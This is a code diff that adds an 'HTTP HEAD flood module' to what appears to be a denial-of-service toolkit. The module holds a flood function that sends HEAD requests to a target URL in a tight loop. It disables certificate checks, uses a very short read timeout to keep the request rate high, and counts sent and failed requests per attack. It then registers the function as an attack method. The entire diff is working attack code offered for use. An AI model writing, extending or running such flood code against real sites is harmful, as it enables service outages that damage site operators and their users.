@@ -22,13 +22,42 @@ SOFTWARE.
 
 '''
 
-from threading import Lock
+'''
+HTTP HEAD flood module
+'''
 
-class Core:
-    threadLock = Lock()
-    methods = {}
-    infodict = {}
-    attackrunning = True
-    threadcount = 0
-    bypass_cache = True
-    session = None
+import time, requests
+from src.core import Core
+from src.utils import *
+from src.useragent import *
+
+def flood(attack_id, url, stoptime) -> None:
+
+    while time.time() < stoptime and Core.attackrunning:
+        try:
+            Core.session.head(
+                utils().buildblock(url), 
+                headers=utils().buildheaders(url),
+                verify=False, 
+                timeout=(5,0.1), 
+                allow_redirects=False,
+                stream=False,
+                cert=None,
+            )
+
+            Core.infodict[attack_id]['req_sent'] += 1
+        except requests.exceptions.ReadTimeout:
+            Core.infodict[attack_id]['req_sent'] += 1
+
+        except Exception:
+            Core.infodict[attack_id]['req_fail'] += 1
+
+        Core.infodict[attack_id]['req_total'] += 1
+    Core.threadcount -= 1
+
+Core.methods.update({
+    'HEAD': {
+        'info': 'HTTP HEAD flood, with basic customizablity',
+        'func': flood
+    }
+})
